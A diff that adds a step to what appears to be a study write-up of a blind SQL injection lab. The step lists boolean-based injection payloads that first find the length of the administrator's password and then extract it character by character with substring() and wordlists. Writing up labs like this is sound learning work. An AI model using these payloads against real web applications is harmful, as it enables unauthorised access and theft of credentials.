@@ -569,6 +569,11 @@ This uses the double-pipe sequence `||` which is a string concatenation operator
 - Explain: it will output text **'administrator'** if that username actually exists in the **USERS** table - which we expected. If **TRUE**, the output will be checking if 'administrator'='admintrator'.
 - Expected Result: if there a **welcome back message** --> **administrator** username exists.
 
+**Step 4: Blind guess password**
 
+- What we found: **USERS table**, username: **administrator**. USER table has column named: **password**.
+- First, guess the **length of password**: `' and (select username from users where username = 'administrator' and length(password) > 1) = 'administrator' --`, `' and (select username from users where username = 'administrator' and length(password) < 15) = 'administrator' --`, `' and (select username from users where username = 'administrator' and length(password) = 20) = 'administrator' --`. --> **Password length = 20**
+- Then, **guess the first letter** by fuzzing with alpha-numer wordlist: `' and (select substring(password,1,1) from users where username = 'administrator') = 'word-list' --`. --> **first letter is: l** --> meaning so far everything is correct.
+- Finally, **guess the whole password** with 2 wordlists and quite some time. `' and (select substring(password,number-list,1) from users where username = 'administrator') = 'alpha-num-list' --` 
 
 
